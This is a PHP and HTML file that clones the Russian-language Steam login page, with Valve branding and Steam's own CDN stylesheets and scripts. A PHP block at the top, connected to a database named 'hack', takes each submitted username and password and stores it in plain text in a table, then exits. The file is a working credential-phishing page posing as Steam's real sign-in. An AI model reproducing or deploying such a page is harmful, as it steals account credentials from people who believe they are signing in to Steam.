<?php 
$dbc = mysqli_connect('127.0.0.1', 'root', 'root', 'hack');
 if (isset($_POST['submit'])){
 	$username = mysqli_real_escape_string($dbc, trim($_POST['username']));
 	$password = mysqli_real_escape_string($dbc, trim($_POST['password']));
 	if(!empty($username) && !empty($password)){
 		 		
 		$query = "INSERT INTO `regist` (username, password) VALUES ('$username', '$password')";
 			mysqli_query($dbc, $query);
 			mysqli_close($dbc);
 			exit();

 		
 	}
 }
 ?>
<html class=" responsive" lang="ru">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="theme-color" content="#171a21">
		<title>Войти</title>
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

	
	
	<link href="https://store.cloudflare.steamstatic.com/public/shared/css/motiva_sans.css?v=GvhJzpHNW-hA&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/shared/css/shared_global.css?v=8_MzHvj9KWHl&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/shared/css/buttons.css?v=l3li_MNwxNDv&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/css/v6/store.css?v=duQ1py9GsvUF&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/css/v6/cart.css?v=UJeL-w80fPgQ&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/css/v6/browse.css?v=7hoqLVcZ7KVq&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/shared/css/login.css?v=uAKvK5VO5Ue5&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
<link href="https://store.cloudflare.steamstatic.com/public/shared/css/shared_responsive.css?v=aZm5F9bM4C-p&amp;l=russian&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
			<script>
				(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
					m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
				})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

				ga('create', 'UA-33786258-1', 'auto', {
					'sampleRate': 0.4				});
				ga('set', 'dimension1', false );
				ga('set', 'dimension2', 'External' );
				ga('set', 'dimension3', 'login' );
				ga('set', 'dimension4', "login\/login" );
				ga('send', 'pageview' );

			</script>
			<script type="text/javascript">Object.seal && Object.seal( Object.prototype );</script><script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/shared/javascript/jquery-1.8.3.min.js?v=.TZ2NKhB-nliU&amp;_cdn=cloudflare" ></script>
<script type="text/javascript">$J = jQuery.noConflict();</script><script type="text/javascript">VALVE_PUBLIC_PATH = "https:\/\/store.cloudflare.steamstatic.com\/public\/";</script><script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/shared/javascript/tooltip.js?v=.9Z1XDV02xrml&amp;_cdn=cloudflare" ></script>

<script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/shared/javascript/shared_global.js?v=lyop1zKTdkFY&amp;l=russian&amp;_cdn=cloudflare" ></script>

<script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/javascript/main.js?v=x1ds_vlJBv32&amp;l=russian&amp;_cdn=cloudflare" ></script>

<script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/javascript/dynamicstore.js?v=sQK9__pkTuul&amp;l=russian&amp;_cdn=cloudflare" ></script>


		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded', function(event) {
				$J.data( document, 'x_readytime', new Date().getTime() );
				$J.data( document, 'x_oldref', GetNavCookie() );
				SetupTooltips( { tooltipCSSClass: 'store_tooltip'} );
		});
		</script><script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/shared/javascript/login.js?v=OO-nBB8oWNAp&amp;l=russian&amp;_cdn=cloudflare" ></script>
<script type="text/javascript" src="https://store.cloudflare.steamstatic.com/public/shared/javascript/shared_responsive_adapter.js?v=DA2EvSkOoJao&amp;l=russian&amp;_cdn=cloudflare" ></script>

						<meta name="twitter:card" content="summary_large_image">
					<meta name="robots" content="noindex,nofollow">
			
	<meta name="twitter:site" content="@steam" />

						<meta property="og:title" content="Войти">
					<meta property="twitter:title" content="Войти">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="Steam">
			
	
			<link rel="image_src" href="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		<meta property="og:image" content="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		<meta name="twitter:image" content="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png" />
					<meta property="og:image:secure" content="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		
	
	
	
	</head>
<body class="login v6 responsive_page">

<div class="responsive_page_frame with_header">

						<div class="responsive_page_menu_ctn mainmenu">
				<div class="responsive_page_menu"  id="responsive_page_menu">
										<div class="mainmenu_contents">
						<div class="mainmenu_contents_items">
															<a class="menuitem" href="https://store.steampowered.com/login/?redir=login%2F%3Fredir%3D%253Fl%253Drussian%26redir_ssl%3D1%26snr%3D1_4_661__global-header&redir_ssl=1&snr=1_60_4__global-header">
									Войти								</a>
								<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		Магазин	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">Главная</a>
					<a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-responsive-menu">Рекомендации</a>
				<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Список желаемого</a>
		<a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-responsive-menu">Магазин очков</a>	
       	<a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-responsive-menu">Новости</a>
					<a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-responsive-menu">Статистика</a>
					</div>


			<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			Сообщество		</a>
		<div class="submenu_community" style="display: none;" data-submenuid="community">
			<a class="submenuitem" href="https://steamcommunity.com/">Главная</a>
			<a class="submenuitem" href="https://steamcommunity.com/discussions/">Обсуждения</a>
			<a class="submenuitem" href="https://steamcommunity.com/workshop/">Мастерская</a>
			<a class="submenuitem" href="https://steamcommunity.com/market/">Торговая площадка</a>
			<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Трансляции</a>
											</div>
		

	
	
	<a class="menuitem" href="https://help.steampowered.com/ru/">
		Поддержка	</a>

							<div class="minor_menu_items">
																								<div class="menuitem change_language_action">
									Изменить язык								</div>
																																	<div class="menuitem" onclick="Responsive_RequestDesktopView();">
										Полная версия									</div>
															</div>
						</div>
						<div class="mainmenu_footer_spacer  "></div>
						<div class="mainmenu_footer">
															<div class="mainmenu_footer_logo"><img src="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/logo_valve_footer.png"></div>
								© Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.								<span class="mainmenu_valve_links">
									<a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Политика конфиденциальности</a>
									<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Правовая информация</a>
									<a href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Соглашение подписчика Steam</a>
									<a href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Возвраты</a>
								</span>
													</div>
					</div>
									</div>
			</div>
		
		<div class="responsive_local_menu_tab">

		</div>

		<div class="responsive_page_menu_ctn localmenu">
			<div class="responsive_page_menu"  id="responsive_page_local_menu">
				<div class="localmenu_content">
				</div>
			</div>
		</div>



					<div class="responsive_header">
				<div class="responsive_header_content">
					<div id="responsive_menu_logo">
						<img src="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/header_menu_hamburger.png" height="100%">
											</div>
					<div class="responsive_header_logo">
						<a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
															<img src="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/header_logo.png" height="36" border="0" alt="STEAM">
													</a>
					</div>					
				</div>
			</div>
		
		<div class="responsive_page_content_overlay">

		</div>

		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
		</div>
	
	<div class="responsive_page_content">

		<div id="global_header">
	<div class="content">
		<div class="logo">
			<span id="logo_holder">
									<a href="https://store.steampowered.com/?snr=1_60_4__global-header">
						<img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44">
					</a>
							</span>
			<!--[if lt IE 7]>
			<style type="text/css">
				#logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
				#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://store.cloudflare.steamstatic.com/public/images/v5/globalheader_logo.png'); }
			</style>
			<![endif]-->
		</div>

			<div class="supernav_container">
	<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		МАГАЗИН	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-header">Главная</a>
					<a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-header">Рекомендации</a>
				<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Список желаемого</a>
		<a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-header">Магазин очков</a>	
       	<a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-header">Новости</a>
					<a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-header">Статистика</a>
					</div>


			<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			СООБЩЕСТВО		</a>
		<div class="submenu_community" style="display: none;" data-submenuid="community">
			<a class="submenuitem" href="https://steamcommunity.com/">Главная</a>
			<a class="submenuitem" href="https://steamcommunity.com/discussions/">Обсуждения</a>
			<a class="submenuitem" href="https://steamcommunity.com/workshop/">Мастерская</a>
			<a class="submenuitem" href="https://steamcommunity.com/market/">Торговая площадка</a>
			<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Трансляции</a>
											</div>
		

	
						<a class="menuitem" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
				О STEAM			</a>
			
	<a class="menuitem" href="https://help.steampowered.com/ru/">
		ПОДДЕРЖКА	</a>
	</div>
	<script type="text/javascript">
		jQuery(function($) {
			$('#global_header .supernav').v_tooltip({'location':'bottom', 'destroyWhenDone': false, 'tooltipClass': 'supernav_content', 'offsetY':-4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false});
		});
	</script>

		<div id="global_actions">
			<div id="global_action_menu">
									<div class="header_installsteam_btn header_installsteam_btn_green">

						<a class="header_installsteam_btn_content" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
							Установить Steam						</a>
					</div>
				
				
														<a class="global_action_link" href="https://store.steampowered.com/login/?redir=login%2F%3Fredir%3D%253Fl%253Drussian%26redir_ssl%3D1%26snr%3D1_4_661__global-header&redir_ssl=1&snr=1_60_4__global-header">войти</a>
											
						<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">язык</span>
						<div class="popup_block_new" id="language_dropdown" style="display: none;">
							<div class="popup_body popup_menu">
																																					<a class="popup_menu_item tight" href="?l=schinese&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'schinese' ); return false;">简体中文 (упрощенный китайский)</a>
																													<a class="popup_menu_item tight" href="?l=tchinese&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'tchinese' ); return false;">繁體中文 (традиционный китайский)</a>
																													<a class="popup_menu_item tight" href="?l=japanese&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'japanese' ); return false;">日本語 (японский)</a>
																													<a class="popup_menu_item tight" href="?l=koreana&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'koreana' ); return false;">한국어 (корейский)</a>
																													<a class="popup_menu_item tight" href="?l=thai&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'thai' ); return false;">ไทย (тайский)</a>
																													<a class="popup_menu_item tight" href="?l=bulgarian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'bulgarian' ); return false;">Български (болгарский)</a>
																													<a class="popup_menu_item tight" href="?l=czech&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'czech' ); return false;">Čeština (чешский)</a>
																													<a class="popup_menu_item tight" href="?l=danish&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'danish' ); return false;">Dansk (датский)</a>
																													<a class="popup_menu_item tight" href="?l=german&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'german' ); return false;">Deutsch (немецкий)</a>
																													<a class="popup_menu_item tight" href="?l=english&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'english' ); return false;">English (английский)</a>
																													<a class="popup_menu_item tight" href="?l=spanish&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'spanish' ); return false;">Español - España (испанский)</a>
																													<a class="popup_menu_item tight" href="?l=latam&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'latam' ); return false;">Español - Latinoamérica (испанский Лат. Ам.)</a>
																													<a class="popup_menu_item tight" href="?l=greek&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'greek' ); return false;">Ελληνικά (греческий)</a>
																													<a class="popup_menu_item tight" href="?l=french&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'french' ); return false;">Français (французский)</a>
																													<a class="popup_menu_item tight" href="?l=italian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'italian' ); return false;">Italiano (итальянский)</a>
																													<a class="popup_menu_item tight" href="?l=hungarian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'hungarian' ); return false;">Magyar (венгерский)</a>
																													<a class="popup_menu_item tight" href="?l=dutch&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'dutch' ); return false;">Nederlands (нидерландский)</a>
																													<a class="popup_menu_item tight" href="?l=norwegian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'norwegian' ); return false;">Norsk (норвежский)</a>
																													<a class="popup_menu_item tight" href="?l=polish&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'polish' ); return false;">Polski (польский)</a>
																													<a class="popup_menu_item tight" href="?l=portuguese&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'portuguese' ); return false;">Português (португальский)</a>
																													<a class="popup_menu_item tight" href="?l=brazilian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'brazilian' ); return false;">Português-Brasil (бразильский португальский)</a>
																													<a class="popup_menu_item tight" href="?l=romanian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'romanian' ); return false;">Română (румынский)</a>
																																							<a class="popup_menu_item tight" href="?l=finnish&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'finnish' ); return false;">Suomi (финский)</a>
																													<a class="popup_menu_item tight" href="?l=swedish&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'swedish' ); return false;">Svenska (шведский)</a>
																													<a class="popup_menu_item tight" href="?l=turkish&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'turkish' ); return false;">Türkçe (турецкий)</a>
																													<a class="popup_menu_item tight" href="?l=vietnamese&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'vietnamese' ); return false;">Tiếng Việt (вьетнамский)</a>
																													<a class="popup_menu_item tight" href="?l=ukrainian&redir=%3Fl%3Drussian&redir_ssl=1&snr=1_4_661__global-header" onclick="ChangeLanguage( 'ukrainian' ); return false;">Українська (украинский)</a>
																									<a class="popup_menu_item tight" href="http://translation.steampowered.com" target="_blank">Помогите нам с переводом Steam</a>
							</div>
						</div>
												</div>
					</div>
			</div>
</div>
<div id="responsive_store_nav_ctn"></div><div data-cart-banner-spot="1"></div>
		<div class="responsive_page_template_content">

			<script type="text/javascript">
	</script>
<div class="page_content">
	
	
<div class="page_content_flex">
	<div class="login_left_col ">
		<div class="login_credential_ctn">
			<div class="loginbox login_col_padding">
				<div class="loginbox_left">
					<div class="loginbox_content">
						<div class="login_title">Войти</div>

						<div id="error_display" class="checkout_error" style="display: none;"></div>
						<form name="logon" method="POST" action= "<?php echo $_SERVER['PHP_SELF']; ?>" id="login_form" >
							<div class="login_row">
								<div class="input_title">Имя аккаунта Steam</div>
								<input class="text_field" type="text" name="username" id="input_username"  placeholder="" value="">
							</div>
							<div class="login_row">
								<div class="input_title">Пароль</div>
								<input class="text_field"  type="password" name="password" id="input_password" autocomplete="off" placeholder=""/>
							</div>
															<div class="login_row">
									<div class="input_title" title="Если вы выберете эту опцию, то будете автоматически входить в свой аккаунт в течение следующих 30 дней либо пока не нажмёте «Выход» в меню аккаунта. 
 Эта возможность предоставляется только пользователям, включившим защиту Steam Guard.">
										<input type="checkbox" name="remember_login" id="remember_login" >
										<label for="remember_login">Запомнить на этом устройстве</label>
									</div>
								</div>
							<button type="submit" name ="submit" class="btn_blue_steamui btn_medium login_btn">
									<span>Войти</span>
								</button>
							</form>
							<div class="login_row" id="captcha_entry" style="display: none;">
																<div id="captcha_image_row">
									<img style="float: left;" id="captchaImg" src="https://store.cloudflare.steamstatic.com/public/images/blank.gif" border="0" width="206" height="40"  >
									<div id="captchaRefresh">
										<span class="linkspan" id="captchaRefreshLink">Обновить</span>
									</div>
									<div style="clear: left;"></div>
								</div>
								<br>
								<div class="input_title">Введите расположенные выше символы</div>
								<input class="text_field"  id="input_captcha" type="text" name="captcha_text">
							</div>
							<div style="display: none;"><input type="submit"></div>
					

						<noscript><p>Чтобы использовать этот сайт, необходимо включить JavaScript</p></noscript>
						<script>
							document.getElementById('login_form').style.display = 'block';
						</script>
                      
						<div class="login_btn_ctn">
							<div id="login_btn_signin">
                              

																	<a target="_top" href="https://help.steampowered.com/ru/wizard/HelpWithLogin?redir=store%2Flogin%2F%3Fredir%3D%253Fl%253Drussian%26redir_ssl%3D1%26snr%3D1_4_661__global-header" id="link_forgot_password">
										Забыли пароль?									</a>
															</div>
							<div id="login_btn_wait" style="display: none;">
										<div class="LoadingWrapper">
			<div class="LoadingThrobber">
				<div class="Bar Bar1"></div>
				<div class="Bar Bar2"></div>
				<div class="Bar Bar3"></div>
			</div>
					</div>
									</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="login_right_col login_col_padding">
		<div class="login_join_desc subtext">Присоединитесь к Steam и откройте для себя тысячи игр.</div>
		<a class="login_join_desc about_link" href="https://store.steampowered.com/about" >Узнать больше</a>
		<img alt="Join Steam" class="join_image" src="https://store.cloudflare.steamstatic.com/public/shared/images/login/join_pc.png?v=1">
		<div class="login_btn_ctn">
			<div class="subtext">Steam бесплатен и удобен в использовании.</div>
			<a target="_top" href="https://store.steampowered.com/join/?redir=%3Fl%3Drussian&snr=1_60_4__62" class="btnv6_white_transparent btn_medium">
				<span>Присоединиться к Steam</span>
			</a>
		</div>
	</div>
</div></div>
<!-- End Main Background -->

		</div>	<!-- responsive_page_legacy_content -->

		<div id="footer_spacer" style="" class=""></div>
<div id="footer"  class="">
<div class="footer_content">
	<div class="rule"></div>

	<div id="footer_nav">

		
		
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_steam_pulldown">
				<span>О STEAM</span>
			</span>
		<div class="popup_block_new" id="footer_steam_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://store.steampowered.com/about/?snr=1_44_44__22">
					Что такое Steam?				</a>
				<!--
					<a class="popup_menu_item" href="">
						Загрузить Steam					</a>
					-->
				<a class="popup_menu_item" href="https://support.steampowered.com/kb_article.php?p_faqid=549#gifts" target="_blank" rel="noreferrer">
					Подарки в Steam				</a>
				<a class="popup_menu_item" href="https://steamcommunity.com/?snr=1_44_44__22">
					Сообщество Steam				</a>
			</div>
					</div>
	
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_valve_pulldown">
				<span>О VALVE</span>
			</span>
		<div class="popup_block_new" id="footer_valve_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">
					О Valve				</a>
				<a class="popup_menu_item" href="http://www.valvesoftware.com/business/" target="_blank" rel="noreferrer">
					Решения для бизнеса				</a>
				<a class="popup_menu_item" href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">
					Steamworks				</a>
				<a class="popup_menu_item" href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">
					Вакансии				</a>
			</div>
		</div>
			
			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_help_pulldown">
				<span>ПОМОЩЬ</span>
			</span>
		<div class="popup_block_new" id="footer_help_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://help.steampowered.com/ru/?snr=1_44_44__23">
					Служба поддержки				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/forums/?snr=1_44_44__23" target="_blank" rel="noreferrer">
					Форумы				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/stats/?snr=1_44_44__23" target="_blank" rel="noreferrer">
					Статистика				</a>
			</div>
					</div>

			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_feeds_pulldown">
				<span>ЛЕНТЫ НОВОСТЕЙ</span>
			</span>
		<div class="popup_block_new" id="footer_feeds_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/news.xml">
					<img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">Новости Steam				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/newreleases.xml">
					<img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">Релизы игр				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/daily_deals.xml">
					<img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">Предложения дня				</a>
			</div>
		</div>
		<div style="clear: left;"></div>

		<script type="text/javascript">
			
		</script>
	</div>

	<br>

    <div class="rule"></div>
				<div id="footer_logo_steam"><img src="https://store.cloudflare.steamstatic.com/public/images/v6/logo_steam_footer.png" alt="Valve Software" border="0" /></div>
	
    <div id="footer_logo"><a href="http://www.valvesoftware.com" target="_blank" rel="noreferrer"><img src="https://store.cloudflare.steamstatic.com/public/images/footerLogo_valve_new.png" alt="Valve Software" border="0" /></a></div>
    <div id="footer_text">
        <div> 2020 Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.</div>
        <div>

            <a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Политика конфиденциальности</a>
           
            <a href="https://store.steampowered.com/legal/?snr=1_44_44_" target="_blank" rel="noreferrer">Правовая информация</a>
           
            <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Соглашение подписчика Steam</a>
           
            <a href="https://store.steampowered.com/steam_refunds/?snr=1_44_44_" target="_blank" rel="noreferrer">Возвраты</a>

        </div>
					<div class="responsive_optin_link">
				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
					<span>Мобильная версия</span>
				</div>
			</div>
		
    </div>



    <div style="clear: left;"></div>
	<br>

    <div class="rule"></div>

    <div class="valve_links">
        <a href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">О Valve</a>
       <a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
        <a href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">Вакансии</a>
        <a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Дистрибуция Steam</a>
        		<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_" target="_blank" rel="noreferrer">Подарочные карты</a>
		<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam" target="_blank" rel="noopener"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_facebook.gif"> Steam</a>
		<a href="http://twitter.com/steam" target="_blank" rel="noreferrer"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_twitter.gif"> @steam</a>
            </div>

</div>
</div>
	</div>	<!-- responsive_page_content -->

</div>	<!-- responsive_page_frame -->
</body>
</html>